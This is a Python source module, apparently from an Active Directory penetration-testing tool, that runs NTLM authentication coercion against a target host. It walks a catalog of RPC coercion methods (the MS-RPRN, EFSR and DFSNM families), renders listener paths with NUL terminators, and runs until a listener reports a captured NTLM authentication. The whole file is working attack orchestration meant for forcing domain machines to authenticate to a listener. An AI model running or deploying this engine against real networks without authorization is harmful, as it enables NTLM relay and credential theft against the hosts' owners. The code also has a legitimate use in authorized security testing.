"""Protocol-neutral async coercion contracts and orchestration.

The coercion layer owns the reusable execution model: method metadata,
listener path generation, RPC endpoint dispatch, bounded runtime, and result
classification. Transport-specific code lives behind ``RpcProtocolAdapter`` so
future relay chains can reuse the same coercion engine with different listener
or relay backends.
"""

from __future__ import annotations

import asyncio
import time
from dataclasses import dataclass, field
from typing import Any, Callable, Literal, Protocol

from adscan_internal.rich_output import (
    mark_sensitive,
    print_info_debug,
    print_info_verbose,
    print_warning_debug,
)


CoercionAuthType = Literal["smb", "http"]
RpcTransport = Literal["ncan_np", "ncacn_ip_tcp"]

# A ``capture_signal`` returns True the instant a REAL inbound NTLM capture has
# been observed by the out-of-band listener. It is the only authoritative stop
# condition for a coercion run: a clean RPC return is never proof that the
# target authenticated back, so the engine keeps walking the catalog until the
# listener confirms a capture (or the timeout / catalog is exhausted).
CaptureSignal = Callable[[], bool]


def _coercion_method_delay() -> float:
    """Pause between coercion methods on one host, from the scan pacing."""
    from adscan_core.scan_pacing import active_pacing, component_pacing  # noqa: PLC0415

    return float(component_pacing(active_pacing(), "coercion.methods")["delay_s"])


@dataclass(frozen=True)
class CoercionListener:
    """Listener endpoint that the target should authenticate to."""

    auth_type: CoercionAuthType
    host: str
    port: int | None = None


@dataclass(frozen=True)
class CoercionTarget:
    """Remote machine to coerce."""

    host: str
    display_name: str | None = None
    metadata: dict[str, Any] = field(default_factory=dict)

    @property
    def label(self) -> str:
        """Human-readable target label."""

        return self.display_name or self.host


@dataclass(frozen=True)
class RpcEndpoint:
    """RPC endpoint descriptor normalized across RPC implementations."""

    transport: RpcTransport
    protocol: str
    uuid: str
    version: str
    pipe: str | None = None

    @property
    def label(self) -> str:
        """Short endpoint label for debug output."""

        if self.pipe:
            return f"{self.transport}:{self.pipe}"
        return f"{self.transport}:{self.uuid} v{self.version}"


@dataclass(frozen=True)
class CoercionMethodResult:
    """Result of one coercion method attempt.

    ``probable_auth_triggered`` is a *heuristic* hint only: the RPC call did not
    raise, or it failed with an error code that some servers return after they
    have already initiated the outbound authentication (e.g. bad-netpath). It is
    NEVER treated as proof of a callback - only the listener's real capture
    signal stops the run. ``success`` therefore stays False on every attempt
    here; the aggregate :attr:`CoercionRunResult.captured` reflects the real
    capture observed out of band.
    """

    target: CoercionTarget
    method_name: str
    protocol: str
    listener: CoercionListener
    endpoint: RpcEndpoint | None
    path: str | None
    success: bool
    probable_auth_triggered: bool = False
    error: str | None = None
    error_code: str | None = None
    duration_seconds: float = 0.0
    metadata: dict[str, Any] = field(default_factory=dict)


class RpcSession(Protocol):
    """Connected protocol-specific RPC session."""

    async def __aenter__(self) -> RpcSession:
        """Enter the connected RPC session context."""

    async def __aexit__(self, exc_type: Any, exc: Any, traceback: Any) -> None:
        """Close the connected RPC session context."""


class RpcProtocolAdapter(Protocol):
    """Adapter that connects coercion methods to one RPC implementation."""

    async def iter_endpoints(
        self,
        *,
        target: CoercionTarget,
        protocol: str,
    ) -> list[RpcEndpoint]:
        """Return candidate endpoints for a protocol."""

    async def connect(
        self,
        *,
        target: CoercionTarget,
        endpoint: RpcEndpoint,
    ) -> RpcSession:
        """Connect and bind to one RPC endpoint."""


class CoercionTrigger(Protocol):
    """Callable used by a coercion method to execute against an RPC session."""

    async def __call__(self, rpc: RpcSession, path: str) -> Any:
        """Trigger the coercion method."""


@dataclass(frozen=True)
class CoercionMethod:
    """Declarative coercion method definition."""

    name: str
    protocol: str
    opnum: int
    auth_path_templates: tuple[tuple[CoercionAuthType, str], ...]
    trigger: CoercionTrigger
    success_markers: tuple[str, ...] = ()
    description: str | None = None
    technique: str | None = None
    cve_id: str | None = None
    cvss_v3: float | None = None
    cvss_vector: str | None = None
    mitre: tuple[str, ...] = ()
    references: tuple[str, ...] = ()

    def supports_listener(self, listener: CoercionListener) -> bool:
        """Return whether this method can target the listener auth type."""

        return any(
            auth_type == listener.auth_type
            for auth_type, _template in self.auth_path_templates
        )


@dataclass(frozen=True)
class CoercionRunConfig:
    """Bounded coercion engine runtime configuration.

    ``capture_signal`` is the authoritative stop condition: when supplied, the
    engine polls it before every attempt and after every attempt and stops the
    instant it returns True (a REAL inbound NTLM capture was observed by the
    listener). Without it the engine walks the entire ordered catalog and stops
    only on timeout or exhaustion. The legacy ``stop_on_first_success``
    heuristic (stop when an RPC merely did not raise) is intentionally NOT a
    stop condition anymore - it caused premature stops on false positives that
    never reached vectors like MS-RPRN.
    """

    listeners: tuple[CoercionListener, ...]
    methods: tuple[CoercionMethod, ...]
    timeout_seconds: float = 60.0
    delay_seconds: float = field(
        default_factory=lambda: _coercion_method_delay()
    )  # pause between methods on one host; scan pacing ``coercion.methods`` (0.05 s default)
    protocols: tuple[str, ...] = ()
    transports: tuple[RpcTransport, ...] = ()
    method_names: tuple[str, ...] = ()
    auth_types: tuple[CoercionAuthType, ...] = ()
    capture_signal: CaptureSignal | None = None


@dataclass(frozen=True)
class CoercionRunResult:
    """Aggregate result for a coercion run."""

    target: CoercionTarget
    results: tuple[CoercionMethodResult, ...]
    timed_out: bool
    attempts: int
    captured: bool = False

    @property
    def success(self) -> bool:
        """Return whether the listener observed a REAL inbound NTLM capture.

        This is driven solely by the out-of-band capture signal - never by the
        per-attempt heuristic. A run that exhausts the whole catalog with clean
        RPC returns but no real callback is NOT a success.
        """

        return self.captured

    @property
    def probable_results(self) -> tuple[CoercionMethodResult, ...]:
        """Return attempts whose RPC heuristically looked like a trigger."""

        return tuple(
            result for result in self.results if result.probable_auth_triggered
        )

    @property
    def successful_results(self) -> tuple[CoercionMethodResult, ...]:
        """Return the attempts that heuristically looked like a trigger.

        Retained for backward compatibility with summary renderers that read
        the "most likely" attempt. When a real capture occurred the relevant
        attempt is among :attr:`probable_results`; callers must not treat this
        as proof of capture (use :attr:`captured`).
        """

        return self.probable_results


class CoercionEngine:
    """Async dispatcher for native coercion methods."""

    def __init__(
        self,
        *,
        target: CoercionTarget,
        rpc_adapter: RpcProtocolAdapter,
        config: CoercionRunConfig,
    ) -> None:
        self.target = target
        self.rpc_adapter = rpc_adapter
        self.config = config

    def _real_capture_observed(self) -> bool:
        """Return True when the listener has confirmed a real NTLM capture."""

        signal = self.config.capture_signal
        if signal is None:
            return False
        try:
            return bool(signal())
        except Exception:  # noqa: BLE001 - capture polling must never raise
            return False

    async def run(self) -> CoercionRunResult:
        """Run configured coercion methods against the target.

        Walks the entire ordered catalog of in-scope methods. The only early
        stop is a REAL inbound NTLM capture reported by ``capture_signal`` -
        the per-attempt RPC outcome is recorded as a heuristic hint but never
        ends the run on its own.
        """

        deadline = time.monotonic() + self.config.timeout_seconds
        attempts = 0
        results: list[CoercionMethodResult] = []

        print_info_verbose(
            "Testing native coercion methods against "
            f"{mark_sensitive(self.target.label, 'hostname')} "
            f"using {len(self.config.listeners)} listener path(s)."
        )

        for method in self._iter_methods():
            if self._real_capture_observed():
                return self._build_result(results, attempts, timed_out=False)
            if time.monotonic() >= deadline:
                return self._build_result(results, attempts, timed_out=True)

            endpoints = await self._get_filtered_endpoints(method)
            if not endpoints:
                print_info_debug(
                    "[coercion] no endpoints for "
                    f"target={mark_sensitive(self.target.label, 'hostname')} "
                    f"method={mark_sensitive(method.name, 'text')} "
                    f"protocol={mark_sensitive(method.protocol, 'text')}"
                )
                continue

            for endpoint in endpoints:
                for listener, template in self._iter_listener_templates(method):
                    if self._real_capture_observed():
                        return self._build_result(results, attempts, timed_out=False)
                    if time.monotonic() >= deadline:
                        return self._build_result(results, attempts, timed_out=True)

                    path = render_coercion_path(template, listener)
                    attempts += 1
                    result = await self._run_attempt(method, endpoint, listener, path)
                    results.append(result)
                    if result.probable_auth_triggered:
                        print_info_debug(
                            "[coercion] probable authentication trigger (heuristic, "
                            "NOT a confirmed capture) "
                            f"target={mark_sensitive(self.target.label, 'hostname')} "
                            f"method={mark_sensitive(method.name, 'text')} "
                            f"endpoint={mark_sensitive(endpoint.label, 'text')}"
                        )

                    # A real capture may have landed while this attempt ran -
                    # check immediately so we stop before issuing the next one.
                    if self._real_capture_observed():
                        return self._build_result(results, attempts, timed_out=False)

                    if self.config.delay_seconds > 0:
                        await asyncio.sleep(self.config.delay_seconds)

        return self._build_result(
            results, attempts, timed_out=time.monotonic() >= deadline
        )

    def _build_result(
        self,
        results: list[CoercionMethodResult],
        attempts: int,
        *,
        timed_out: bool,
    ) -> CoercionRunResult:
        return CoercionRunResult(
            self.target,
            tuple(results),
            timed_out=timed_out,
            attempts=attempts,
            captured=self._real_capture_observed(),
        )

    def _iter_methods(self) -> tuple[CoercionMethod, ...]:
        protocols = {protocol.upper() for protocol in self.config.protocols}
        method_names = {name.lower() for name in self.config.method_names}
        auth_types = set(self.config.auth_types)

        methods: list[CoercionMethod] = []
        for method in self.config.methods:
            if protocols and method.protocol.upper() not in protocols:
                continue
            if method_names and method.name.lower() not in method_names:
                continue
            if auth_types and not any(
                auth_type in auth_types
                for auth_type, _template in method.auth_path_templates
            ):
                continue
            if not any(
                method.supports_listener(listener) for listener in self.config.listeners
            ):
                continue
            methods.append(method)
        return tuple(methods)

    async def _get_filtered_endpoints(
        self, method: CoercionMethod
    ) -> tuple[RpcEndpoint, ...]:
        endpoints = await self.rpc_adapter.iter_endpoints(
            target=self.target, protocol=method.protocol
        )
        transports = set(self.config.transports)
        if transports:
            endpoints = [
                endpoint for endpoint in endpoints if endpoint.transport in transports
            ]
        return tuple(endpoints)

    def _iter_listener_templates(
        self,
        method: CoercionMethod,
    ) -> tuple[tuple[CoercionListener, str], ...]:
        pairs: list[tuple[CoercionListener, str]] = []
        for listener in self.config.listeners:
            for auth_type, template in method.auth_path_templates:
                if auth_type == listener.auth_type:
                    pairs.append((listener, template))
        return tuple(pairs)

    async def _run_attempt(
        self,
        method: CoercionMethod,
        endpoint: RpcEndpoint,
        listener: CoercionListener,
        path: str,
    ) -> CoercionMethodResult:
        started = time.monotonic()
        print_info_debug(
            "[coercion] attempt "
            f"target={mark_sensitive(self.target.label, 'hostname')} "
            f"method={mark_sensitive(method.name, 'text')} "
            f"protocol={mark_sensitive(method.protocol, 'text')} "
            f"endpoint={mark_sensitive(endpoint.label, 'text')} "
            f"path={mark_sensitive(path, 'path')}"
        )
        try:
            rpc = await self.rpc_adapter.connect(target=self.target, endpoint=endpoint)
            async with rpc:
                await method.trigger(rpc, path)
            # The RPC returned cleanly. This is a HEURISTIC hint only - it is not
            # proof that the target authenticated back to the listener, so the
            # attempt is never marked ``success``. Only the listener's real
            # capture signal ends the run.
            return CoercionMethodResult(
                target=self.target,
                method_name=method.name,
                protocol=method.protocol,
                listener=listener,
                endpoint=endpoint,
                path=path,
                success=False,
                probable_auth_triggered=True,
                duration_seconds=time.monotonic() - started,
            )
        except asyncio.CancelledError:
            raise
        except Exception as exc:
            if _is_probable_success(exc, method.success_markers):
                # Some servers initiate the callback and then return an error
                # code (e.g. bad-netpath). Record it as a heuristic hint, never
                # as a confirmed success.
                return CoercionMethodResult(
                    target=self.target,
                    method_name=method.name,
                    protocol=method.protocol,
                    listener=listener,
                    endpoint=endpoint,
                    path=path,
                    success=False,
                    probable_auth_triggered=True,
                    error=str(exc),
                    error_code=_extract_error_code(exc),
                    duration_seconds=time.monotonic() - started,
                )

            # Protocol-level failures (DCERPCSessionError, SMB errors,
            # connection-closed transients, etc.) are expected during coercion
            # enumeration — log a compact, masked one-liner. Only the genuinely
            # unexpected case (a real Python bug) gets the full traceback.
            masked_target = mark_sensitive(self.target.label, "hostname")
            masked_method = mark_sensitive(method.name, "text")
            masked_endpoint = mark_sensitive(endpoint.label, "text")
            failure_line = (
                "[coercion] attempt failed "
                f"target={masked_target} method={masked_method} "
                f"endpoint={masked_endpoint} {_compact_error(exc)}"
            )
            if _is_protocol_level_error(exc):
                print_info_debug(failure_line)
            else:
                print_warning_debug(failure_line)
            return CoercionMethodResult(
                target=self.target,
                method_name=method.name,
                protocol=method.protocol,
                listener=listener,
                endpoint=endpoint,
                path=path,
                success=False,
                error=str(exc),
                error_code=_extract_error_code(exc),
                duration_seconds=time.monotonic() - started,
            )


def _walk_exception_chain(exc: BaseException) -> list[BaseException]:
    """Return the exception with its ``__cause__`` / ``__context__`` chain."""
    seen: set[int] = set()
    chain: list[BaseException] = []
    current: BaseException | None = exc
    while current is not None and id(current) not in seen:
        seen.add(id(current))
        chain.append(current)
        current = current.__cause__ or current.__context__
    return chain


def _is_connection_closed_error(exc: BaseException) -> bool:
    """Return True for expected connection-closed / reset transients.

    A pipe or connection closing mid-coercion is an expected transient: the DC
    routinely tears down the named pipe after a probe. It surfaces from the
    aiosmb stack as a bare ``Exception("Connection closed")`` (module
    ``builtins``) so it dodges the type-name / module checks below — yet it is
    never a Python bug and must not trigger a full traceback. Mirrors the
    connect-time ``ConnectionError`` handling in ``is_ldaps_transport_failure``.
    Kept targeted (no blanket ``OSError``) to avoid masking real bugs.
    """
    indicators = ("connection closed", "connection reset", "broken pipe")
    for candidate in _walk_exception_chain(exc):
        if isinstance(candidate, (ConnectionError, BrokenPipeError, EOFError)):
            return True
        message = str(candidate or "").lower()
        if any(indicator in message for indicator in indicators):
            return True
    return False


def _is_protocol_level_error(exc: BaseException) -> bool:
    """Return True for expected protocol-layer errors during coercion attempts.

    These failures (DCERPC error codes, SMB transport errors, EFSR rejections,
    RPC binding failures, connection-closed transients, etc.) are normal
    outcomes when enumerating coercion methods against a target — not bugs.
    They get a compact one-liner in the debug log instead of a full traceback
    so the terminal doesn't flood.
    """
    if _is_connection_closed_error(exc):
        return True
    type_name = type(exc).__name__
    module = type(exc).__module__ or ""
    # DCERPC/SMB/RPC layer errors from impacket or aiosmb
    if any(
        fragment in type_name
        for fragment in (
            "DCERPCException",
            "DCERPCSessionError",
            "SMBException",
            "SessionError",
            "RPCException",
            "NTSTATUSError",
            "SMBConnectionError",
        )
    ):
        return True
    # aiosmb / impacket module paths
    if any(
        fragment in module
        for fragment in ("dcerpc", "smb", "impacket", "aiosmb", "badldap", "kerbad")
    ):
        return True
    # asyncio / event-loop errors that are expected inside run_async_sync
    if isinstance(exc, RuntimeError) and "event loop" in str(exc).lower():
        return True
    return False


def _is_benign_event_loop_teardown(exc: BaseException | None) -> bool:
    """Return True for the benign post-loop teardown ``RuntimeError``.

    asysocks/aiosmb transport cleanup callbacks fire during GC *after* the
    ``asyncio.run`` loop has already closed, raising ``RuntimeError: no running
    event loop``. It rides on the real coercion exception via ``__context__``
    but did not break the call - the same predicate is already used by
    :func:`_is_protocol_level_error`. Reused here so the misleading
    "(caused by RuntimeError: no running event loop)" suffix is suppressed.
    """
    return isinstance(exc, RuntimeError) and "event loop" in str(exc).lower()


def _compact_error(exc: BaseException) -> str:
    """Return a short one-line description of a coercion failure."""
    cause = exc.__cause__ or exc.__context__
    if (
        cause is not None
        and type(cause).__name__ != type(exc).__name__
        and not _is_benign_event_loop_teardown(cause)
    ):
        return f"{type(exc).__name__}: {exc} (caused by {type(cause).__name__}: {cause})"
    return f"{type(exc).__name__}: {exc}"


def render_coercion_path(template: str, listener: CoercionListener) -> str:
    """Render a listener path template.

    Supported placeholders:
    - ``{listener}``: listener host/IP.
    - ``{listen_port}``: ``@port`` for non-default SMB/HTTP ports, otherwise empty.
    - ``{rnd:N}``: random ASCII token with length ``N``.
    - ``{nul}``: a literal NUL (``\\x00``) terminator. Coercer bakes a trailing
      NUL into every COERCE exploit path; it is the path-string terminator that
      makes EFSR/DFSNM/RPRN parsers perform the netpath lookup that triggers the
      callback. Templates declare it explicitly (raw strings cannot embed a real
      NUL), so MS-EVEN's ``\\aa`` form can opt out by simply omitting ``{nul}``.
    """

    import secrets
    import string

    rendered = template.replace("{listener}", listener.host)
    port = listener.port
    if port is None:
        port = 80 if listener.auth_type == "http" else 445
    default_port = 80 if listener.auth_type == "http" else 445
    rendered = rendered.replace(
        "{listen_port}", f"@{port}" if port != default_port else ""
    )

    alphabet = string.ascii_letters + string.digits
    while "{rnd:" in rendered:
        start = rendered.index("{rnd:")
        end = rendered.index("}", start)
        length_text = rendered[start + len("{rnd:") : end]
        length = max(1, int(length_text))
        token = "".join(secrets.choice(alphabet) for _ in range(length))
        rendered = f"{rendered[:start]}{token}{rendered[end + 1 :]}"
    # Replace the explicit NUL token LAST so it cannot interfere with the
    # ``{listener}`` / ``{listen_port}`` / ``{rnd:N}`` substitutions above.
    rendered = rendered.replace("{nul}", "\x00")
    return rendered


def _is_probable_success(exc: Exception, markers: tuple[str, ...]) -> bool:
    error = str(exc).lower()
    return any(marker.lower() in error for marker in markers)


def _extract_error_code(exc: Exception) -> str | None:
    for attr in ("error_code", "status", "code"):
        value = getattr(exc, attr, None)
        if value is None:
            continue
        if isinstance(value, int):
            return f"0x{value:x}"
        return str(value)
    return None
